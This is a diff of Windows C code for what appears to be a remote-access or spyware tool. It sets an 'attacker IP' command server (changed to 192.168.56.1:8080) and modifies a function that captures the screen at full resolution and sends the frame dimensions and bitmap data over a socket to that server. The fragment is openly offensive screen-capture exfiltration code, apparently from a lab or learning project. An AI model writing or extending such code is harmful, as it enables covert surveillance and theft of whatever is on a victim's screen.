@@ -10,7 +10,8 @@
 #pragma comment(lib, "Shlwapi.lib")
 
 // attacker IP and primary communication port
-#define CMD_SERVER_ADDR "127.0.0.1"
+//#define CMD_SERVER_ADDR "127.0.0.1"
+#define CMD_SERVER_ADDR "192.168.56.1"
 #define CMD_SERVER_PORT 8080
 
 // change directory and list directory contents
@@ -308,8 +309,8 @@ void videoStreamTest() {
 
 	// after ~5000 frames, this value drops to a massive negative number
 	// the 2's complement hex of this number is CCCCCCCC
-	int width = 1920;  //GetDeviceCaps(hScreenDC, HORZRES);
-	int height = 1080; // GetDeviceCaps(hScreenDC, VERTRES);
+	int width = GetDeviceCaps(hScreenDC, HORZRES);
+	int height = GetDeviceCaps(hScreenDC, VERTRES);
 
 	// create a bitmap compatible with the screen HDC
 	// we can specify the width and height of the bitmap
@@ -386,9 +387,6 @@ void videoStreamTest() {
 	SelectObject(DC, OldBitmap);
 	//height = height < 0 ? -height : height;
 	DeleteDC(DC);
-
-	//printf("Size of hbitmap: %d\n", sizeof(hBitmap));
-	printf("Frame %d x & y: %d x %d\n", frames++, width, height);
 	
 	// send data
 	int bytesToSend = fileSize;
@@ -397,16 +395,20 @@ void videoStreamTest() {
 	int repeats = 0;
 
 	// send frame size if first frame
-	/*if (frames == 0) {
-		int* buff[1];
-		buff[0] = fileSize;
-		retCode = send(mainSock, buff, bytesToSend - bytesSent, 0);
+	if (frames == 0) {
+		int buff[3];
+		buff[0] = width;
+		buff[1] = height;
+		buff[2] = fileSize;
+		retCode = send(mainSock, buff, 12, 0);
 		if (retCode == SOCKET_ERROR) {
 			printf("Could not send data: %d\n", WSAGetLastError());
 			exitOnError();
 		}
-		frames++;
-	}*/
+	}
+
+	// print the size of the bitmap for the current frame - used for debug
+	printf("Frame %d x & y: %d x %d\n", frames++, width, height);
 
 	// vertically flip the image - just something with how the screen capture works
 	for (int row = 0; row < height; row++) {
